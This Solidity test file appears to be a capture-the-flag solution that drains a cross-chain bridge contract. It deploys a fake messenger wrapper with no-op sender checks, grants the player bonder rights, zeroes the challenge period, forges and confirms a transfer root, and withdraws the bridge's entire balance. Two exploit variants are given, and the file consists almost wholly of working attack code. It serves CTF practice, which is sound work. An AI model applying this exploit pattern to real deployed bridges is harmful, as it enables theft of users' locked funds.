// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console2.sol";
import "./Deploy.sol";
import "src/Challenge.sol";

contract MessengerWrapper {
    function confirmTransferRoot(
        address bridge,
        uint256 originChainId,
        bytes32 rootHash,
        uint256 targetChainId,
        uint256 totalAmount,
        uint256 rootCommittedAt
    ) external {
        IBridge(bridge).confirmTransferRoot(originChainId, rootHash, targetChainId, totalAmount, rootCommittedAt);
    }

    function sendCrossDomainMessage(bytes memory _calldata) external {
        require(true);
    }

    function verifySender(address l1BridgeCaller, bytes memory _data) external {
        require(true);
    }
}

interface IBridge {
    function withdraw(
        address recipient,
        uint256 amount,
        bytes32 transferNonce,
        uint256 bonderFee,
        uint256 amountOutMin,
        uint256 deadline,
        bytes32 rootHash,
        uint256 transferRootTotalAmount,
        uint256 transferIdTreeIndex,
        bytes32[] calldata siblings,
        uint256 totalLeaves
    ) external;

    function confirmTransferRoot(
        uint256 originChainId,
        bytes32 rootHash,
        uint256 targetChainId,
        uint256 totalAmount,
        uint256 rootCommittedAt
    ) external;

    function governance() external view returns (address);

    function bondTransferRoot(bytes32 rootHash, uint256 targetChainId, uint256 totalAmount) external;

    function setChallengePeriod(uint256) external;

    function addBonder(address bonder) external;

    function setChallengeResolutionPeriod(uint256) external;

    function setCrossDomainMessengerWrapper(uint256, MessengerWrapper) external;

    function getTransferId(
        uint256 chainId,
        address recipient,
        uint256 amount,
        bytes32 transferNonce,
        uint256 bonderFee,
        uint256 amountOutMin,
        uint256 deadline
    ) external pure returns (bytes32);

    function setGovernance(address) external;
}

contract Solve is Deploy {
    uint256 amount;

    function test_Solve() public {
        vm.startBroadcast(player);

        uint256 chainId = 1;
        amount = bridge.balance;
        uint256 targetChainId = 10;

        MessengerWrapper mw = new MessengerWrapper();
        IBridge(bridge).addBonder(player);
        IBridge(bridge).setChallengePeriod(0);
        IBridge(bridge).setCrossDomainMessengerWrapper(targetChainId, mw);

        bytes32 receipt = keccak256("attack");
        IBridge(bridge).bondTransferRoot(receipt, targetChainId, amount);

        uint256 deadline = block.timestamp * 2;
        bytes32 leaf = keccak256(abi.encode(chainId, player, amount, 0, 0, 0, deadline));
        bytes32 rootHash = keccak256(abi.encodePacked(leaf, receipt));
        IBridge(bridge).confirmTransferRoot(targetChainId, rootHash, chainId, amount, block.timestamp);

        bytes32[] memory siblings = new bytes32[](1);
        siblings[0] = receipt;
        IBridge(bridge).withdraw(player, amount, 0, 0, 0, deadline, rootHash, amount, 0, siblings, 2);

        assert(validation());

        vm.stopBroadcast();
    }

    function test_Solve_2() public {
        amount = bridge.balance;

        vm.startBroadcast(player);

        uint256 chainId = 1;
        uint256 destinationChainId = 10;
        uint256 deadline = block.timestamp * 2;
        bytes32 rootHash = keccak256(abi.encode(chainId, player, amount, 0, 0, 0, deadline));

        MessengerWrapper mw = new MessengerWrapper();
        IBridge(bridge).setChallengePeriod(0);
        IBridge(bridge).addBonder(player);
        IBridge(bridge).setCrossDomainMessengerWrapper(destinationChainId, mw);

        IBridge(bridge).bondTransferRoot(rootHash, chainId, amount);

        bytes32[] memory siblings = new bytes32[](0);
        IBridge(bridge).withdraw(player, amount, 0, 0, 0, deadline, rootHash, amount, 0, siblings, 1);

        vm.stopBroadcast();

        assert(validation());
    }

    function validation() internal view returns (bool) {
        return Challenge(challenge).isSolved();
    }
}
